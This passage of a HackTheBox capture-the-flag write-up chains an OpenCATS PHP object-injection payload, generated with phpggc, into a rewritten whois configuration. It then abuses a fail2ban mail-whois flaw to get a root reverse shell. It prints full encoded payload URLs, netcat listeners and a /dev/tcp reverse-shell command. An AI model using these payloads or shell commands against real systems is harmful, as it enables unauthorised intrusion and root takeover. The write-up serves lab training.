Trying to sign in with the username and password we already know for `jennifer` (`jennifer:bQ3u7^AxzcB7qAsxE3`) is successful.

Searching for "opencats 0.9.5.2 exploit" finds [CVE-2021-25294](https://nvd.nist.gov/vuln/detail/CVE-2021-25294), which links to [OpenCATS PHP Object Injection to Arbitrary File Write](https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html). According to [nvd.nist.gov](https://nvd.nist.gov/vuln/detail/CVE-2021-25294), "OpenCATS through 0.9.5-3 unsafely deserializes index.php?m=activity requests, leading to remote code execution. This occurs because lib/DataGrid.php calls unserialize for the parametersactivity:ActivityDataGrid parameter. The PHP object injection exploit chain can leverage an __destruct magic method in guzzlehttp."

According to [the blog post](https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html), we can use [ambionics/phpggc](https://github.com/ambionics/phpggc) to generate a payload by running `./phpggc Guzzle/FW1 <remote_path> <local_path>`. The contents of the the file at `local_path` will be read into the payload and when the payload is executed they will be placed into the file at `remote_path`.

The blog post says we can use this vulnerability by sending a GET request to `localhost:8080/index.php?m=activity&parametersactivity%3AActivityDataGrid=[PAYLOAD HERE]`.

So, we generate a test payload with `./phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/target random_file` where `random_file` simply contains `okay`.

This produces:

```
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A6%3A%22okay%0A%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A15%3A%22%2Fdev%2Fshm%2Ftarget%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
```

So, now we can navigate to the following URL in our web browser, which will create the `/dev/shm/target` file with the contents `okay`.

```
localhost:8080/index.php?m=activity&parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A6%3A%22okay%0A%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A15%3A%22%2Fdev%2Fshm%2Ftarget%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
```

This is successful! Running `ls -la /dev/shm/target` shows `-rw-r--r-- 1 devel devel 50 Feb 28 03:31 /dev/shm/target`. So, the OpenCATS service is running under the `devel` user. The contents of this file are `[{"Expires":1,"Discard":false,"Value":"okay\n\n"}]`, which is strange because my file only had `okay` in it.

Unfortunately, this is a dead end. While we have an arbitrary file read and write exploit, this exploit is only good for places that `devel` has access to. Running `find / -group devel -or -user devel 2>/dev/null` lists all the files that `devel` has permissions on:

```
/dev/shm/target
/opt/opencats/INSTALL_BLOCK
/usr/local/src
/usr/local/etc
```

`/dev/shm/target` is the file we just created, `/opt/opencats/INSTALL_BLOCK` is a simple file used to prevent the OpenCATS installer from running, and both `/usr/local/src` and `/usr/local/etc` are empty and not obviously used for anything. So, we need to find a differnt privilege escalation route.

### Fail2Ban

I noticed `fail2ban` appearing in the LinPEAS logs quite a bit and I have never seen it on a HackTheBox machine before so I decided to look into it.

We can get the version with `fail2ban-server --version`, which returns `Fail2Ban v0.10.2`.

Searching for "Fail2Ban v0.10.2 exploit" finds [this list of vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-5567/Fail2ban.html), of which one is [CVE-2021-32749](https://www.cvedetails.com/cve/CVE-2021-32749/): "fail2ban is a daemon to ban hosts that cause multiple authentication errors. In versions 0.9.7 and prior, 0.10.0 through 0.10.6, and 0.11.0 through 0.11.2, there is a vulnerability that leads to possible remote code execution in the mailing action mail-whois. Command `mail` from mailutils package used in mail actions like `mail-whois` can execute command if unescaped sequences (`\n~`) are available in "foreign" input (for instance in whois output). To exploit the vulnerability, an attacker would need to insert malicious characters into the response sent by the whois server, either via a MITM attack or by taking over a whois server. The issue is patched in versions 0.10.7 and 0.11.3. As a workaround, one may avoid the usage of action `mail-whois` or patch the vulnerability manually." Versions "**0.10.0 through 0.10.6**" are vulnerable, which means the version the target is running, `v0.10.2`, is vulnerable.

Searching online for "CVE-2021-32749" finds [the GitHub advisory](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) with a message from the person who found the vulnerability and [this blog post](https://research.securitum.com/fail2ban-remote-code-execution/) also by the vulnerability finder.

We double check the file discussed in the blog post with `cat /etc/fail2ban/action.d/mail-whois.conf` to make sure that the `actionban` value is the same as stated in the article, which it is:

```
actionban = printf %%b "Hi,\n
            The IP <ip> has just been banned by Fail2Ban after
            <failures> attempts against <name>.\n\n
            Here is more information about <ip> :\n
            `%(_whois_command)s`\n
            Regards,\n
            Fail2Ban"|mail -s "[Fail2Ban] <name>: banned <ip> from <fq-hostname>" <dest>
```

So, the text from `printf` gets piped into the `mail` command. According to the [mailutils manual](https://mailutils.org/manual/mailutils.html#index-_007e_0021_002c-mail-escape): "The ‘~!’ escape executes specified command and returns you to mail compose mode without altering your message. When used without arguments, it starts your login shell. The ‘~|’ escape pipes the message composed so far through the given shell command and replaces the message with the output the command produced. If the command produced no output, mail assumes that something went wrong and retains the old contents of your message." So, for example, if we could place `~! uname -a` inside the text printed by `printf`, then that command would run as `root`.

The only way we can pipe arbitrary content into `mail` is if we can control the output of `_whois_command`.

The default `_whois_command` command is `whois`. Looking at the `man` page for `whois` we see that it stores it configuration at `/etc/whois.conf`. If we could write to this file we could start our own `whois` server that returns a response with a `~!` in it, which, when the ban action is initiated, would be piped into `mail` and trigger whatever command we wanted. However, we cannot write to this file.

Running `which whois` outputs `/usr/local/bin/whois`, which is strange because it normally should be installed to `/usr/bin/whois`. This makes me think that it might not use the normal `/etc/whois.conf` file as its configuration.

If we run `strings /usr/local/bin/whois | grep whois.conf` we see the following:

```
/usr/local/etc/whois.conf
Cannot open /usr/local/etc/whois.conf
```

Alright, so it reads its confiration from `/usr/local/etc/whois.conf`. This is amazing for us because as we saw earlier the `devel` user has write permissions to the `/usr/local/etc/` directory.

The OpenCATS exploit we tried earlier can write to the `/usr/local/etc/whois.conf` file. However, it adds extra data other than what we specify because of the GuzzleHTTP cookie that is used.

Anyway, we first need to figure out the format of the `whois.conf` file. Searching online finds [this page](http://manpages.ubuntu.com/manpages/bionic/man5/whois.conf.5.html), which says "It's a plain text file in ASCII encoding. Each line consists of two fields: a pattern to match WHOIS object identifier and a corresponding WHOIS server domain name." The site also gives an example:

```
\.nz$             nz.whois-servers.net
# Hangul Korean TLD
\.xn--3e0b707e$   whois.kr
# Private ASNs
^as645(1[2-9]|2[0-9]|3[0-4])$    whois.example.net
```

So, our file should be the following (where `10.10.14.169` is our ip address) because the `.*` regular expression matches anything:

```
.*   10.10.14.169
```

However, this will not work because of the GuzzleHTTP cookie data that gets added to our file. So, our regular expression needs to be `|.*` because the `|` symbol is the "or" operator, which means our expression will match whatever comes before it or anything.

So, our configuartion file should be this:

```
|.*   10.10.14.169
```

We can save this to a file called `whoisconfig` locally and then create the OpenCATS exploit payload with `./phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whoisconfig`, which outputs the following:

```
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A19%3A%22%7C.%2A+++10.10.14.169%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
```

So, we can navigate to the following URL to create the `/usr/local/etc/whois.conf` with our desired contents:

```
localhost:8080/index.php?m=activity&parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A19%3A%22%7C.%2A+++10.10.14.169%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
```

The file is created as expected with the following contents: `[{"Expires":1,"Discard":false,"Value":"|.*   10.10.14.169\n"}]`.

Now, we just need to start our own "whois" server, which we can do with netcat like so: `nc -nvlp 43 < revshell` where `revshell` contains our reverse shell payload: `~| bash -c 'bash -i >& /dev/tcp/10.10.14.169/4348 0>&1'` (notice the `~|` characters to take advantage of command execution in the `mail` command). We listen on port `43`, which is reserved for whois requests, and we return the reverse shell text.

Then, start a listener to recieve the reverse shell by running `nc -nvlp 4348`.

Attempting to run `whois 10.10.14.169` to test fails with this error message: `Invalid regular expression '[{"Expires":1,"Discard":false,"Value":"|.*': Unmatched [, [^, [:, [., or [=`. Apparently we need to close the braces in our `whois.conf` file. So, instead our configration file should be this:

```
}]|.*   [10.10.14.169]
```

So, we edit `whoisconfig` with `nano` and rerun `./phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whoisconfig` to get:

```
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A23%3A%22%7D%5D%7C.%2A+++%5B10.10.14.169%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
```

Navigating to the new URL below adds the correct config file:

```
localhost:8080/index.php?m=activity&parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A23%3A%22%7D%5D%7C.%2A+++%5B10.10.14.169%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
```

Now, running `whois 10.10.14.169` returns our reverse shell text just like we want: `~| bash -c 'bash -i >& /dev/tcp/10.10.14.169/4348 0>&1'`.

When `fail2ban` runs `whois` it will also get this text (instead of a legitimate whois response) which will be piped into the `mail` command and will be run because of the `~|` characters.

All we have to do now is trigger a `fail2ban` `banaction`. We can see that the sshd jail is enabled by looking at the `/etc/fail2ban/jail.d/defaults-debian.conf` file. So, we can trigger a `banaction` by failing to sign into SSH as `root` three times (make sure you have `nc -nvlp 43 < revshell` and `nc -nvlp 4348` running):

```
$ ssh root@admirer-gallery.htb
root@admirer-gallery.htb's password:
Permission denied, please try again.
root@admirer-gallery.htb's password:
Permission denied, please try again.
root@admirer-gallery.htb's password:
root@admirer-gallery.htb: Permission denied (publickey,password).
```

In our window running `nc -nvlp 43 < revshell` we see the following:

```
connect to [10.10.14.169] from (UNKNOWN) [10.10.11.137] 51638
10.10.14.169
```

So, the connection went through and the reverse shell was sent. Now, we just kill that `nc` so the connection is closed and we immediately get a reverse shell in our terminal running `nc -nvlp 4348`:

```
connect to [10.10.14.169] from (UNKNOWN) [10.10.11.137] 42294
bash: cannot set terminal process group (18074): Inappropriate ioctl for device
bash: no job control in this shell
root@admirertoo:/# cat /root/root.txt
cat /root/root.txt
[ROOT FLAG]
```

This shell only lasts a few seconds so be quick to get the `root.txt` flag.
